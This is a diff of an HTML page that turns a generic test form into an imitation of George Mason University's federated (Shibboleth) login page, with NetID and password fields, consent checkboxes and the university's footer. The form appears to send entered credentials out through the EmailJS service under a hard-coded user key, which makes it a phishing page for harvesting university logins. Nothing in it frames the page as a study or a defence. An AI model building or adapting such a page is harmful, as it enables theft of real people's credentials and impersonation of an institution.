@@ -1,16 +1,13 @@
-
 <!DOCTYPE html>
-<html>
+<html><!-- Container ID: $custom['hostname'] -->
 <head>
-  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-  <title>Test template template_hdbcH0Zb</title>
-  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-  <meta name="robots" content="noindex, nofollow">
-  <meta name="googlebot" content="noindex, nofollow">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-<link rel="stylesheet" href="https://unpkg.com/purecss@0.6.2/build/pure-min.css" integrity="sha384-UQiGfs9ICog+LwheBSRCt1o5cbyKIHbwjWscjemyBMT9YCUMZffs6UqUTd0hObXD" crossorigin="anonymous">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>George Mason Federated Login Service</title>
+    <link rel="stylesheet" href="https://unpkg.com/purecss@0.6.2/build/pure-min.css" integrity="sha384-UQiGfs9ICog+LwheBSRCt1o5cbyKIHbwjWscjemyBMT9YCUMZffs6UqUTd0hObXD" crossorigin="anonymous">
     <link rel="stylesheet" type="text/css" href="main.css">
-<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2.3.2/dist/email.min.js"></script>
+   <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2.3.2/dist/email.min.js"></script>
 <script type="text/javascript">
    (function(){
       emailjs.init("user_pynlPd9jnF3gDm35msesz");
@@ -20,49 +17,7 @@
     type="text/javascript"
     src="/js/lib/dummy.js"
     
-  ></script>
-
-    <link rel="stylesheet" type="text/css" href="/css/result-light.css">
-
-
-  <!--<style id="compiled-css" type="text/css">
-      body {
-  font-family: arial;
-  font-size: 12px;
-  color: #666;
-}
-form {
-  width: 500px;
-  background: white;
-  padding: 20px 25px;
-  margin: auto;
-  margin-top: 30px;
-  box-shadow: 0px 1px 2px rgba(0,0,0,0.2);
-}
-form input,
-form textarea {
-  font: inherit;
-  padding: 5px 5px;
-  width: 100%;
-  margin-top: 3px;
-  margin-bottom: 15px;
-  box-sizing: border-box;
-}
-form button {
-  border: 1px solid rgba(0,0,0,0.2);
-  padding: 8px 35px;
-  font-size: 12px;
-  background: #888;
-  color: white;
-}
-form label {
-  color: #777;
-  font-size: 11px;
-  margin-bottom: 2px;
-  display: block;
-}
-  </style> -->
-
+  ></script> 
 </head>
 <body>
 <div class="wrapper">
@@ -77,16 +32,17 @@ form label {
     <div class="section login">
         
 
-      <form id="myform" method="post">
-           <div class="form-element-wrapper">
-                  <label>username</label>
-					<input type="text" name="to_name" />
-           </div>
-          
-            <div class="form-element-wrapper">
-				<label>password</label>
-				<input type="text" name="gmukey" />
+        <form id="myform" method="post">
 
+                        
+            <div class="form-element-wrapper">
+                <label for="username">NetID</label>
+                <input class="form-element form-field" id="username" name="to_name" type="text" value="">
+            </div>
+
+            <div class="form-element-wrapper">
+                <label for="password">Password</label>
+                <input class="form-element form-field" id="password" name="gmukey" type="password" value="">
             </div>
 
             <div class="form-element-wrapper">
@@ -98,21 +54,13 @@ form label {
                 <input id="_shib_idp_revokeConsent" type="checkbox" name="_shib_idp_revokeConsent" value="true">
                 <label for="_shib_idp_revokeConsent">Clear prior granting of permission for release of your information to this service.</label>
             </div>
- <div class="form-element-wrapper mt-4">
+
+                        <div class="form-element-wrapper mt-4">
                 <button class="form-element form-button" type="submit" name="_eventId_proceed" onclick="this.childNodes[0].nodeValue='Logging in, please wait...'">Login</button>
             </div>
-        </form>
-<footer>
-    <div class="container container-footer">
-        <p class="footer-text">Copyright © George Mason University</p>
-        <address>
-            Information Technology Services<br> 
-            703-993-8870<br>
-            <a href="mailto:support@gmu.edu">
-                support@gmu.edu            </a>
-        </address>
-    </div>
-</footer>
+            
+                    </form>
+
         
                         
     </div>
@@ -130,7 +78,18 @@ form label {
 </div>
 </div>
 
-
+<footer>
+    <div class="container container-footer">
+        <p class="footer-text">Copyright © George Mason University</p>
+        <address>
+            Information Technology Services<br> 
+            703-993-8870<br>
+            <a href="mailto:support@gmu.edu">
+                support@gmu.edu            </a>
+        </address>
+    </div>
+</footer>
+</div>
 <script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
 
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2.3.2/dist/email.min.js"></script>
@@ -181,5 +140,6 @@ myform.submit(function(event){
     // always overwrite window.name, in case users try to set it manually
     window.name = "result"
   </script>
-</body>
-</html>
+
+</body></html>
+<!-- Container ID: $custom['hostname'] -->
